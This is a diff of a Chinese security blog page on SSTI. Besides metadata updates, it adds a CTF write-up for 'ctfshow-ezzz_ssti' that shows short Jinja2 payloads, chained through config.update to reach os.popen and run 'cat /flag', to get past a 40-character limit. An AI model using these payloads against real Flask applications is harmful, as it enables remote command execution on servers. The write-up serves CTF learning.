@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://hello-ctf.com/hc-web/assets/image-20231128133158187.png">
 <meta property="og:image" content="https://img2024.cnblogs.com/blog/3450162/202407/3450162-20240717154937641-936215290.png">
 <meta property="article:published_time" content="2026-03-13T01:54:17.000Z">
-<meta property="article:modified_time" content="2026-03-22T06:38:17.172Z">
+<meta property="article:modified_time" content="2026-10-18T11:53:17.782Z">
 <meta property="article:author" content="Cl1ck-t0">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="web漏洞">
@@ -162,7 +162,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssti%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSTI注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-payload-python3"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 通用 payload ( Python3 )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96"><span class="toc-number">1.3.</span> <span class="toc-text"> 二编：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 常见payload：</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssti%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSTI注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-payload-python3"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 通用 payload ( Python3 )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96"><span class="toc-number">1.3.</span> <span class="toc-text"> 二编：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 常见payload：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E4%BE%8B"><span class="toc-number">1.4.</span> <span class="toc-text"> 典例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-ezzz_ssti"><span class="toc-number">1.4.1.</span> <span class="toc-text"> ctfshow-ezzz_ssti</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -173,7 +173,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Post</div>
-    <div class="sidebar-state-number">33</div>
+    <div class="sidebar-state-number">34</div>
   </div>
   <div class="sidebar-state-category">
     <div>Category</div>
@@ -229,7 +229,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-03-13T01:54:17.000Z" itemprop="datePublished">2026-03-13</time>
-    <time style="display: none;" id="post-update-time">2026-03-22</time>
+    <time style="display: none;" id="post-update-time">2026-10-18</time>
   </span>
 </div>
 
@@ -346,6 +346,28 @@
 <ol start="2">
 <li></li>
 </ol>
+<p>后续补充。。。</p>
+<h2 id="典例"><a class="markdownIt-Anchor" href="#典例"></a> 典例</h2>
+<h3 id="ctfshow-ezzz_ssti"><a class="markdownIt-Anchor" href="#ctfshow-ezzz_ssti"></a> ctfshow-ezzz_ssti</h3>
+<p>很明显的SSTI，不演了，直接把SSTI放在明面上给我们，但是这题做了长度的限制。</p>
+<p>简单试了一下，发现限制长度40字符😭</p>
+<p>那么正常情况下的payload是过不了长度限制的，那我们该如何破局呢？</p>
+<p>我们先看看配置文件试试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello &lt;Config &#123;&#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093&#125;&gt;</span><br></pre></td></tr></table></figure>
+<p>而我们要知道的是</p>
+<p>Flask 框架中存在 config 全局对象，用来保存配置信息。config 对象实质上是一个字典的子类，可以像字典一样操作。因此要更新字典，我们可以使用 Python 中字典的 update（） 方法。用 update（） 方法 + 关键字参数更新字典</p>
+<p>首先我们先将config.update存为短变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.update(a=config.update)%&#125;</span><br></pre></td></tr></table></figure>
+<p>然后将<code>lipsum.__globals__</code>存入g,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.a(g=lipsum.__globals__)%&#125;</span><br></pre></td></tr></table></figure>
+<p>然后更新o的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.a(o=config.g.os)%&#125;</span><br></pre></td></tr></table></figure>
+<p>取出popen：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.a(p=config.o.popen)%&#125;</span><br></pre></td></tr></table></figure>
+<p>读取flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.p(&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>本文参考资料：<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_3">SSTI 注入 - Hello CTF</a></p>
 
     </div>
@@ -355,7 +377,7 @@
     <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/">https://cl1ck-t0.github.io/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/</a></p>
     
     <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-13 09:54:17</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-03-22 14:38:17</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-10-18 19:53:17</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
@@ -397,7 +419,7 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/covers/anime-girl-kazari-genshin-impact-spring-mask-5k-3840x2160-7950.jpg" data-sizes="auto" alt="burp靶场漏洞实战" class="lazyload">
+            <img data-src="/covers/kamisato-ayaka-5k-3840x2160-23010.jpg" data-sizes="auto" alt="burp靶场漏洞实战" class="lazyload">
         <a href="/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/" aria-label="Prev: burp靶场漏洞实战" title="Prev: burp靶场漏洞实战"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
@@ -405,7 +427,7 @@
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/pd-image (2).png" data-sizes="auto" alt="变量覆盖漏洞" class="lazyload">
+          <img data-src="/covers/f5e805c6995916c5a07e6a9c07b219bf.jpg" data-sizes="auto" alt="变量覆盖漏洞" class="lazyload">
       <a href="/2026/03/05/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" aria-label="Next: 变量覆盖漏洞"  title="Next: 变量覆盖漏洞"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -454,10 +476,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        69.8k
+        71.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        05:21
+        05:30
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -479,7 +501,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssti%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSTI注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-payload-python3"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 通用 payload ( Python3 )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96"><span class="toc-number">1.3.</span> <span class="toc-text"> 二编：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 常见payload：</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssti%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSTI注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-payload-python3"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 通用 payload ( Python3 )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96"><span class="toc-number">1.3.</span> <span class="toc-text"> 二编：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 常见payload：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E4%BE%8B"><span class="toc-number">1.4.</span> <span class="toc-text"> 典例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-ezzz_ssti"><span class="toc-number">1.4.1.</span> <span class="toc-text"> ctfshow-ezzz_ssti</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -490,7 +512,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Post</div>
-    <div class="sidebar-state-number">33</div>
+    <div class="sidebar-state-number">34</div>
   </div>
   <div class="sidebar-state-category">
     <div>Category</div>
@@ -636,7 +658,7 @@
           description: "",
           stripContent: " SSTI注入 简述：SSTI（Server-Side Template Injection） 服务器端模板注入，攻击者能够向服务器端模板引擎注入恶意模板代码，从而在服务器端执行任意代码。  一、前置基础 首先我们要知道什么是模板。 模板 是一种用于生成动态内容的工具。 它们通常包含两个基本部分：静态内容和动态占位符。 如图：绿色 部分为 静态内容 ，而 橙色 部分则是 动态占位符  模板的主要作用是分离业务逻辑和展示逻辑，使得前端开发者和后端开发者可以并行工作，同时也使得代码更易于维护。 静态",
           date: "Fri Mar 13 2026 09:54:17 GMT+0800",
-          updated: "Sun Mar 22 2026 14:38:17 GMT+0800",
+          updated: "Sun Oct 18 2026 19:53:17 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
